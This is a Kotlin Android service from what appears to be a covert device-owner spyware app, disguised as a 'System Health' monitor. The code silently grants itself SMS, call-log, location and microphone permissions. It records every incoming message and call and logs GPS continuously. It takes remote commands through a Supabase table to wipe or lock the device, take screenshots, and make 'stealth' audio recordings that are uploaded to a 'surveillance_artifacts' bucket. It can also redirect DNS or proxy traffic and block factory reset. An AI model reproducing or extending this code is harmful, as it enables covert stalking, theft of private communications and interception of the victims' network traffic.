package com.system.dpc

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.app.admin.ProxyInfo
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.graphics.Bitmap
import android.location.Location
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.CancellationSignal
import android.os.UserManager
import android.provider.CallLog
import android.provider.Settings
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import io.github.jan.supabase.gotrue.auth
import io.github.jan.supabase.gotrue.providers.builtin.Email
import io.github.jan.supabase.postgrest.postgrest
import io.github.jan.supabase.realtime.PostgresAction
import io.github.jan.supabase.realtime.realtime
import io.github.jan.supabase.storage.storage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.guava.await
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

class MainService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private lateinit var db: AppDatabase
    private lateinit var smsObserver: ContentObserver
    private lateinit var callLogObserver: ContentObserver
    private lateinit var locationCallback: LocationCallback
    private lateinit var wakeLock: PowerManager.WakeLock

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Supabase.initialize()
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdmin::class.java)
        db = AppDatabase.getDatabase(this)

        grantPermissions()
        registerObservers()
        scheduleSyncWorker()
        startLocationUpdates()

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DPC::LocationWakeLock")
    }

    private fun grantPermissions() {
        if (dpm.isDeviceOwnerApp(packageName)) {
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.READ_SMS, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.READ_CALL_LOG, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.ACCESS_FINE_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.ACCESS_BACKGROUND_LOCATION, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setPermissionGrantState(adminComponent, packageName, Manifest.permission.RECORD_AUDIO, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
            dpm.setLocationEnabled(adminComponent, true)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(1, notification)

        scope.launch {
            while (true) {
                performSupabaseHandshake()
                delay(60000) // Check every minute
            }
        }
        scope.launch {
            subscribeToCommands()
        }

        return START_STICKY
    }

    private suspend fun performSupabaseHandshake() {
        var attempts = 0
        var signedIn = false
        while (!signedIn && attempts < 5) {
            try {
                val session = Supabase.client.auth.sessionStatus.first()
                if (session is io.github.jan.supabase.gotrue.SessionStatus.Authenticated) {
                    signedIn = true
                } else {
                    val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    val email = "device_$deviceId@system.local"
                    val password = "password" // You should use a more secure way to handle this
                    try {
                        Supabase.client.auth.signUpWith(Email) {
                            this.email = email
                            this.password = password
                        }
                    } catch (e: Exception) {
                        // User might already exist, try to sign in
                        Supabase.client.auth.signInWith(Email) {
                            this.email = email
                            this.password = password
                        }
                    }
                }

                if (Supabase.client.auth.sessionStatus.first() is io.github.jan.supabase.gotrue.SessionStatus.Authenticated) {
                    upsertDeviceStatus()
                }

            } catch (e: Exception) {
                attempts++
                delay(1000L * (attempts * attempts)) // Exponential backoff
            }
        }
    }

    private suspend fun upsertDeviceStatus() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val device = Device(
            id = deviceId,
            model = Build.MODEL,
            android_version = Build.VERSION.RELEASE,
            battery_level = getBatteryLevel()
        )
        Supabase.client.postgrest.from("devices").upsert(device)
    }

    private suspend fun subscribeToCommands() {
        try {
            Supabase.client.realtime.connect()
            val channel = Supabase.client.realtime.channel("commands")
            channel.postgresChangeFlow<PostgresAction.Insert>(schema = "public", table = "commands").collect {
                val command = it.decodeAs<Command>()
                if (command.status == "pending") { // Process only pending commands
                    handleCommand(command)
                }
            }
            Supabase.client.realtime.addChannel(channel)
        } catch (e: Exception) {
            delay(5000)
            subscribeToCommands()
        }
    }

    private suspend fun handleCommand(command: Command) {
        if (!dpm.isAdminActive(adminComponent)) return

        var status = "executed"
        var responsePayload: String? = null
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        try {
            when (command.action) {
                "WIPE" -> dpm.wipeData(0)
                "LOCK" -> dpm.lockNow()
                "LOCATE" -> {
                    try {
                        val location = getLocation()
                        responsePayload = "${location.latitude},${location.longitude}"
                    } catch (e: Exception) {
                        throw Exception("Location permission not granted or GPS disabled.")
                    }
                }
                "LOCATE_NOW" -> {
                    val location = getLocation()
                    Supabase.client.postgrest.from("location_history").insert(LocationHistory(latitude = location.latitude, longitude = location.longitude, altitude = location.altitude, speed = location.speed, bearing = location.bearing, timestamp = System.currentTimeMillis()))
                    responsePayload = "Location pushed to Supabase"
                }
                "TOGGLE_CAMERA" -> {
                    val cameraDisabled = dpm.getCameraDisabled(adminComponent)
                    dpm.setCameraDisabled(adminComponent, !cameraDisabled)
                    responsePayload = "Camera is now ${if (!cameraDisabled) "disabled" else "enabled"}"
                }
                "RECORD_AUDIO_30S" -> {
                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                    if (pm.isInteractive) {
                        throw Exception("Screen is active. Stealth recording aborted.")
                    }
                    val timestamp = System.currentTimeMillis()
                    val audioFile = File(cacheDir, "audio_$timestamp.m4a")
                    val helper = AudioCaptureHelper()
                    helper.startRecording(this, audioFile)
                    delay(31000) // Wait for recording to finish + buffer
                    
                    if (audioFile.exists()) {
                        val path = "$deviceId/audio/$timestamp.m4a"
                        Supabase.client.storage.from("surveillance_artifacts").upload(path, audioFile.readBytes())
                        audioFile.delete()
                        responsePayload = path
                    } else {
                        throw Exception("Audio file creation failed.")
                    }
                }
                "TAKE_SCREENSHOT" -> {
                    val timestamp = System.currentTimeMillis()
                    val serviceInstance = DpcAccessibilityService.instance ?: throw Exception("Accessibility Service not bound.")
                    
                    serviceInstance.captureScreenshot { bitmap ->
                        if (bitmap != null) {
                            scope.launch {
                                val stream = ByteArrayOutputStream()
                                bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                                val byteArray = stream.toByteArray()
                                val path = "$deviceId/screen/$timestamp.png"
                                Supabase.client.storage.from("surveillance_artifacts").upload(path, byteArray)
                                
                                val updatedCommand = command.copy(status = "executed", response_payload = path)
                                Supabase.client.postgrest.from("commands").update(updatedCommand) { filter { eq("id", command.id) } }
                            }
                        }
                    }
                    return // Async handled
                }
                "SET_DNS" -> {
                    if (dpm.isDeviceOwnerApp(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val hostname = command.payload ?: throw Exception("DNS hostname payload missing.")
                        dpm.setGlobalPrivateDnsModeSpecifiedHost(adminComponent, hostname)
                        responsePayload = "DNS updated to $hostname"
                    } else {
                        throw Exception("Operation restricted to Device Owner or API 29+.")
                    }
                }
                "SET_PROXY" -> {
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val payload = command.payload ?: throw Exception("Proxy payload missing (host:port).")
                        val parts = payload.split(":")
                        if (parts.size != 2) throw Exception("Invalid proxy format. Use host:port")
                        val host = parts[0]
                        val port = parts[1].toInt()
                        val proxyInfo = ProxyInfo.buildDirectProxy(host, port)
                        dpm.setRecommendedGlobalProxy(adminComponent, proxyInfo)
                        responsePayload = "Proxy updated to $payload"
                    } else {
                        throw Exception("Operation restricted to Device Owner.")
                    }
                }
                "SET_STATUS_BAR" -> {
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val disabled = command.payload?.toBoolean() ?: true
                        dpm.setStatusBarDisabled(adminComponent, disabled)
                        responsePayload = "Status bar disabled: $disabled"
                    } else {
                        throw Exception("Operation restricted to Device Owner.")
                    }
                }
                "DISALLOW_FACTORY_RESET" -> {
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        val restricted = command.payload?.toBoolean() ?: true
                        if (restricted) {
                            dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
                        } else {
                            dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
                        }
                        responsePayload = "Disallow factory reset: $restricted"
                    } else {
                        throw Exception("Operation restricted to Device Owner.")
                    }
                }
            }
        } catch (e: Exception) {
            status = "failed"
            responsePayload = e.message
        }

        val updatedCommand = command.copy(status = status, response_payload = responsePayload)
        Supabase.client.postgrest.from("commands").update(updatedCommand) { filter {
            eq("id", command.id)
        } }
    }

    private suspend fun getLocation(): Location {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            throw SecurityException("Location permission not granted.")
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        val cancellationSignal = CancellationSignal()
        return fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, cancellationSignal).await(cancellationSignal)
    }


    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra("level", -1) ?: -1
        val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
        return if (level == -1 || scale == -1) {
            50 // Default value
        } else {
            (level.toFloat() / scale.toFloat() * 100).toInt()
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Health")
            .setContentText("Monitoring device health")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }

    private fun createNotificationChannel() {
        val serviceChannel = NotificationChannel(
            CHANNEL_ID,
            "Main Service Channel",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(serviceChannel)
    }

    private fun registerObservers() {
        smsObserver = object : ContentObserver(Handler()) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                uri?.let { readSms(it) }
            }
        }
        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)

        callLogObserver = object : ContentObserver(Handler()) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                uri?.let { readCallLog(it) }
            }
        }
        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver)
    }

    private fun readSms(uri: Uri) {
        val cursor = contentResolver.query(uri, null, null, null, null)
        cursor?.use {
            if (it.moveToFirst()) {
                val number = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                val timestamp = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                scope.launch {
                    db.localSmsDao().insert(LocalSms(number = number, body = body, timestamp = timestamp))
                }
            }
        }
    }

    private fun readCallLog(uri: Uri) {
        val cursor = contentResolver.query(uri, null, null, null, null)
        cursor?.use {
            if (it.moveToFirst()) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                val timestamp = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                scope.launch {
                    db.localCallDao().insert(LocalCall(number = number, duration = duration, timestamp = timestamp))
                }
            }
        }
    }

    private fun scheduleSyncWorker() {
        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueue(syncRequest)
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 300000) // 5 minutes
            .setMinUpdateIntervalMillis(60000) // 1 minute
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    scope.launch {
                        db.locationHistoryDao().insert(
                            LocationHistory(
                                latitude = location.latitude,
                                longitude = location.longitude,
                                altitude = location.altitude,
                                speed = location.speed,
                                bearing = location.bearing,
                                timestamp = System.currentTimeMillis()
                            )
                        )
                    }
                }
            }
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        contentResolver.unregisterContentObserver(smsObserver)
        contentResolver.unregisterContentObserver(callLogObserver)
        scope.launch {
            Supabase.client.realtime.disconnect()
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        fusedLocationClient.removeLocationUpdates(locationCallback)
        if (wakeLock.isHeld) {
            wakeLock.release()
        }
    }

    companion object {
        private const val CHANNEL_ID = "MainServiceChannel"
    }
}